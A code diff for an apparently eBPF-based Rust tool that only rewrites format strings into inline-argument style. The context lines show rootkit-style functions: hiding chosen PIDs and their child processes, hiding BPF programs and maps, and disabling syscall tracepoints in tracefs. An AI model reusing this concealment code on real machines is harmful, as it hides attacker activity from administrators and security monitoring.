@@ -38,7 +38,7 @@ async fn main() -> anyhow::Result<()> {
     };
     let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
     if ret != 0 {
-        debug!("remove limit on locked memory failed, ret is: {}", ret);
+        debug!("remove limit on locked memory failed, ret is: {ret}");
     }
 
     let tracepoints = vec![
@@ -51,7 +51,7 @@ async fn main() -> anyhow::Result<()> {
         "../../target/bpfel-unknown-none/release/caracal"
     ))?;
     if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
-        warn!("failed to initialize eBPF logger: {}", e);
+        warn!("failed to initialize eBPF logger: {e}");
     }
     let mut builder = Builder {
         ebpf: &mut ebpf,
@@ -93,10 +93,10 @@ async fn main() -> anyhow::Result<()> {
     let map_ids = full_bpf_info.map_ids;
 
     for p in prog_ids.clone() {
-        info!("bpf prog: {} -> hide", p)
+        info!("bpf prog: {p} -> hide")
     }
     for m in map_ids.clone() {
-        info!("bpf  map: {} -> hide", m)
+        info!("bpf  map: {m} -> hide")
     }
 
     // keep skip-maps updated
@@ -164,14 +164,14 @@ async fn main() -> anyhow::Result<()> {
     let mut idx = 0u32;
     for p in pid.iter() {
         hidden_pids_array.set(idx, HiddenPid::new(p), 0).unwrap();
-        info!("pid: {} -> hide", p);
+        info!("pid: {p} -> hide");
         idx += 1;
         let children = get_descendants(&sys, Pid::from(p.parse::<usize>().unwrap()));
         for child in children.iter() {
             if let Some(task) = sys.process(*child) {
                 info!("pid: {} -> hide child: {} [{:?}]", p, child, task.name());
             } else {
-                info!("pid: {} -> hide child: {}", p, child);
+                info!("pid: {p} -> hide child: {child}");
             }
             hidden_pids_array
                 .set(idx, HiddenPid::new(&child.to_string()), 0)
@@ -189,11 +189,10 @@ async fn main() -> anyhow::Result<()> {
                     if let Err(err) = write_to_tracefs(
                         "0",
                         &format!(
-                            "/sys/kernel/debug/tracing/events/syscalls/sys_{}_{}/enable",
-                            hook, syscall
+                            "/sys/kernel/debug/tracing/events/syscalls/sys_{hook}_{syscall}/enable",
                         ),
                     ) {
-                        println!("error: {}", err);
+                        println!("error: {err}");
                     };
                 }
             }
